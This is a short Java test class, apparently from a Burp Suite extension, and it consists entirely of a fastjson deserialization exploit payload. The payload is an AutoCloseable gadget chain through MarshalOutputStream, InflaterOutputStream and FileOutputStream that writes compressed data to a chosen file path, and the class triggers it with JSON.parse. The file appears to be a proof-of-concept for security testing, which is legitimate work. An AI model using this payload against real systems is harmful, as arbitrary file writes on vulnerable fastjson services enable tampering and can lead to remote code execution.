package burp;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.Arrays;
import java.util.HashMap;

import com.alibaba.fastjson.JSON;
import okhttp3.*;

/**
 * @author f0ng
 * @date 2022/4/22
 */
public class test {
    public static void main(String[] args) {
        String testJson = "{\n" +
                "    '@type':\"java.lang.AutoCloseable\",\n" +
                "    '@type':'sun.rmi.server.MarshalOutputStream',\n" +
                "    'out':\n" +
                "    {\n" +
                "        '@type':'java.util.zip.InflaterOutputStream',\n" +
                "        'out':\n" +
                "        {\n" +
                "           '@type':'java.io.FileOutputStream',\n" +
                "           'file':'/Users/f0ng/tmp/fj_hack_jdk11',\n" +
                "           'append':false\n" +
                "        },\n" +
                "        'infl':\n" +
                "        {\n" +
                "            'input':\n" +
                "            {\n" +
                "                'array':'eNoLz0gsKS4uLVBIL60s1lEoycgsVgCiXAPDVD0FT/VchYzUolSFknyF8sSSzLx0hbT8IoVQhbz8cj0uAGcUE78=',\n" +
                "                'limit':65\n" +
                "            }\n" +
                "        },\n" +
                "        'bufLen':1048576\n" +
                "    },\n" +
                "    'protocolVersion':1\n" +
                "}\n";

        JSON.parse(testJson);
    }


}
